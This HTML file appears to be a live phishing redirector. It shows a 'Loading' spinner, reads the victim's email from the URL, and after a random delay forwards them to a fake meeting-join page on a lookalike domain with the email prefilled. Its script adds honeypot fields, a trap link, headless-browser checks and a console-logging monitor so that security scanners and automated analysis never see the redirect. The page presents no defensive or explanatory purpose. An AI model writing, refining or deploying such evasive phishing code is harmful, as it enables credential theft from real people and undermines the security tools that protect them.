<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading…</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container { text-align: center; }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(0,0,0,0.1);
      border-top: 3px solid #0078d4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 10px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    p { font-size: 0.95rem; color: #555; margin: 0; }
    /* Honeypot Styling */
    #hp { display: none; }
    .hp-trap { 
      opacity: 0; 
      position: absolute; 
      pointer-events: none; 
      height: 0; 
      width: 0; 
      overflow: hidden; 
    }
    /* Trap Link for bots to find and click */
    .trap-link {
      position: absolute;
      top: 0;
      left: 0;
      font-size: 0;
      color: transparent;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Loading, please wait…</p>
    <!-- Original Honeypot -->
    <input type="text" id="hp" autocomplete="off">
    <!-- NEW: Advanced Honeypot (should remain checked) -->
    <input type="checkbox" id="hp2" class="hp-trap" checked>
    <!-- NEW: Trap Link for bots -->
    <a href="about:blank" id="trapLink" class="trap-link">Skip loading</a>
  </div>

  <script>
    (function() {
      // --- Original Code (Preserved) ---
      const d = document;
      const w = window;
      const q = new URLSearchParams(w.location.search);
      const h = w.location.hash;

      const e1 = q.get('email');
      const e2 = h ? h.substring(1) : '';
      const em = e1 || e2;

      const b = 'https://meet-9f7a2e1b83c5.asecure-platform.com/v2/joinmeeting/meet/meeting.html';
      const t = em ? `${b}#${encodeURIComponent(em)}` : b;
      // --- End Original Code ---

      // ===== NEW ADVANCED BOT DETECTION =====
      let redirectBlocked = false;

      // 1. ENHANCED HONEYPOT CHECKS
      const honeypot = d.getElementById('hp');
      const honeypot2 = d.getElementById('hp2');
      // Check if original honeypot was filled
      if (honeypot.value) {
        console.warn('[Bot Detected] Hidden input was filled.');
        redirectBlocked = true;
      }
      // Check if advanced honeypot was UNchecked (a bot trying to be clever)
      if (!honeypot2.checked) {
        console.warn('[Bot Detected] Reverse honeypot was triggered.');
        redirectBlocked = true;
      }

      // 2. TRAP LINK HANDLER
      const trapLink = d.getElementById('trapLink');
      trapLink.addEventListener('click', function(e) {
        e.preventDefault();
        console.warn('[Bot Detected] Trap link was clicked.');
        redirectBlocked = true;
        // Send the bot to a blank page
        w.location.href = this.href;
      });

      // 3. HEADLESS BROWSER CHECKS
      // These are common in automated bots and tools like Puppeteer.
      if (navigator.webdriver || 
          window.outerWidth === 0 || 
          window.outerHeight === 0 ||
          navigator.plugins.length === 0 ||
          /HeadlessChrome/.test(navigator.userAgent)) {
        console.warn('[Bot Detected] Signs of headless browser detected.');
        redirectBlocked = true;
      }

      // 4. CONSOLE MONITOR (If someone tries to log the target URL)
      const originalLog = console.log;
      console.log = function() {
        // If a bot tries to log the target URL 't', block the redirect.
        if (arguments[0] && arguments[0].includes(b)) {
          console.warn('[Bot Detected] Console monitor triggered.');
          redirectBlocked = true;
        }
        return originalLog.apply(console, arguments);
      };

      // --- Original Delay Logic (Preserved) ---
      const delay = Math.floor(Math.random() * 1900) + 2200;

      setTimeout(function() {
        // FINAL CHECK: Before redirecting, check if any trap was triggered
        if (redirectBlocked) {
          // Optionally, just do nothing and leave the spinner spinning forever.
          return;
        }

        // If all checks passed, proceed with the original redirect.
        w.location.replace(t);
      }, delay);
    })();
  </script>
</body>
</html>
